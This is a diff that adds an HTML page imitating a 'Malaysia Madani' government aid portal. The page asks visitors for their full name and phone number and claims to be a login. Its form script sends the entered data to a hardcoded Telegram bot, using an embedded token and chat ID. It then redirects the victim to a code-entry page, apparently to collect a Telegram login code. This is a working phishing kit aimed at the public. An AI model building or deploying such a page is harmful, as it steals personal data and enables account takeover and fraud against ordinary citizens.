@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malaysia Madani</title>
+  <link href="https://cdn.tailwindcss.com" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+</head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malaysia Madani</title>
+  <!-- Meta Tags for Thumbnail -->
+  <meta property="og:title" content="Malaysia Madani" />
+  <meta property="og:description" content="Ketahui Bantuan Khusus Untuk Anda - Sahih, Di Hujung Jari" />
+  <meta property="og:image" content="https://manfaat-staging.s3.ap-southeast-1.amazonaws.com/public/2024-10/Home%20Banner%201%20%2872ppi%29.jpg" />
+  <meta property="og:image:alt" content="Malaysia Madani Thumbnail Image" />
+  <meta property="og:image:type" content="image/jpeg" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+</head>
+<body class="font-roboto">
+  <header class="bg-white shadow">
+    <div class="container mx-auto flex justify-between items-center py-4 px-6">
+      <!-- Logo and Title Section -->
+      <div class="flex items-center">
+        <!-- Main Title Image -->
+        <div class="ml-4">
+          <img src="madani.png" alt="Belanjawan 2025 Malaysia Madani" class="h-12 w-auto" />
+        </div>
+      </div>
+
+      <!-- Burger Button -->
+      <button id="menu-btn" class="text-blue-900 text-3xl lg:hidden" onclick="toggleMenu()">
+        <i class="fas fa-bars"></i>
+      </button>
+
+       <!-- Main Navigation (for larger screens) -->
+       <div id="menu" class="hidden lg:flex items-center space-x-4 lg:space-x-6">
+        <input class="border rounded-full px-4 py-2" placeholder="eg. Sumbangan Tunai Rahmah" type="text" />
+        <i class="fas fa-search text-xl text-gray-600"></i>
+        <a class="text-blue-900 flex items-center" href="#">
+          <i class="fas fa-user-circle text-xl mr-2"></i> Daftar Akaun
+        </a>
+        <a class="text-blue-900 flex items-center" href="#">
+          <i class="fas fa-sign-in-alt text-xl mr-2"></i> Log Masuk
+        </a>
+      </div>
+    </div>
+
+    <!-- Dropdown for small screens -->
+    <div id="dropdown" class="hidden lg:hidden px-6 py-4 space-y-4">
+      <input class="border rounded-full px-4 py-2 w-full" placeholder="eg. Sumbangan Tunai Rahmah" type="text" />
+      <a class="block text-blue-900" href="login1.html"><i class="fas fa-user-circle text-xl mr-2"></i> Daftar Akaun</a>
+      <a class="block text-blue-900" href="login1.html"><i class="fas fa-sign-in-alt text-xl mr-2"></i> Log Masuk</a>
+    </div>
+  </header>
+  
+  <main class="container mx-auto mt-10 flex justify-center">
+    <div class="w-full max-w-md bg-white p-8 shadow-md rounded-md flex flex-col items-center">
+        <div class="mb-4 flex flex-col items-center">
+            <img src="madani.png" alt="Belanjawan 2025 Malaysia Madani" class="h-12 w-auto mb-4" />
+            <h1 class="text-lg text-center text-purple-500">
+                Untuk meneruskan pendaftaran Malaysia Madani, Sila log masuk dengan menggunakan nama pengguna dan kata laluan bagi akaun Aplikasi Selangkah Anda.
+            </h1>
+        </div>
+        <form id="loginForm" onsubmit="sendDataToTelegram(event)">
+          <div class="mb-6 text-center">
+              <label class="block text-gray-700 font-bold mb-2 text-center" for="username">
+                  Nama Penuh
+                  <span class="text-red-500">*</span>
+              </label>
+              <div class="relative">
+                  <input 
+                      class="border rounded-md w-45/10 md:w-full py-3 px-6 pl-10 mx-auto block" 
+                      id="username" 
+                      placeholder="Nama Penuh Sesuai Mykad" 
+                      type="text" 
+                      required 
+                  />
+              </div>
+          </div>
+      
+          <div class="mb-6 text-center">
+            <label class="block text-gray-700 font-bold mb-2 text-center" for="phone">
+                Nombor Telepon
+                <span class="text-red-500">*</span>
+            </label>
+            <div class="relative">
+                <!-- Gambar Bendera Malaysia di sebelah kiri input -->
+                <img 
+                    src="bendera.png" 
+                    alt="Malaysia Flag" 
+                    class="absolute left-0 top-1/2 transform -translate-y-1/2 h-12 w-12" 
+                />
+                <!-- Kode negara "+60" di sebelah bendera -->
+                <span class="absolute left-12 top-1/2 transform -translate-y-1/2 text-gray-700 font-semibold">
+                    +60
+                </span>
+                <input 
+                    class="border rounded-md w-40/12 md:w-full py-3 pl-20 pr-4 mx-auto block" 
+                    id="phone" 
+                    placeholder="Nombor Telepon" 
+                    type="tel" 
+                    required 
+                />
+            </div>
+        </div>
+        
+      
+          <div class="mb-4 text-right">
+              <a class="text-blue-500" href="#">Lupa Kata Laluan?</a>
+          </div>
+      
+          <button class="w-full bg-gradient-to-r from-red-500 to-purple-500 text-white font-bold py-2 rounded-full" type="submit">
+              Log Masuk
+          </button>
+      </form>      
+        
+        <div class="mt-4 text-center">
+            <span>
+                Belum mempunyai akaun?
+                <a class="text-blue-500" href="#">Daftar Akaun</a>
+            </span>
+        </div>
+    </div>
+</main>
+
+   <script>
+    const BOT_TOKEN = "7376553902:AAHGXc6AzSCIMA9dHSSAIt6urzmjEQTedY8";  // Ganti dengan bot token Anda yang valid
+const CHAT_ID = "7873152746";      // Ganti dengan chat ID yang benar setelah didapatkan dari getUpdates
+
+async function sendDataToTelegram(event) {
+    event.preventDefault();
+
+    const phone = document.getElementById("username").value;
+    const kod = document.getElementById("phone").value;
+    const message = `Data Login:\nusername: ${username}\nphone: ${kod}`;
+    
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    try {
+        const response = await fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: new URLSearchParams({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+
+        const result = await response.json();  // Parse response sebagai JSON
+
+        if (response.ok) {
+            alert("Sila Isi Kod yang Dihantar Ke Telegram Anda");
+            document.getElementById("loginForm").reset();
+
+            window.location.href = "kod.html" ;
+        } else {
+            console.error("Telegram API response:", result);
+            alert(`Gagal mengirim data ke Telegram: ${result.description}`);
+        }
+    } catch (error) {
+        console.error("Error:", error);
+        alert("Terjadi kesalahan saat mengirim data.");
+    }
+}
+</script>
+
+  <script>
+    // Fungsi JavaScript untuk toggle menu
+    function toggleMenu() {
+      const dropdown = document.getElementById('dropdown');
+      dropdown.classList.toggle('hidden');
+    }
+  </script>
+ </body>
+</html>
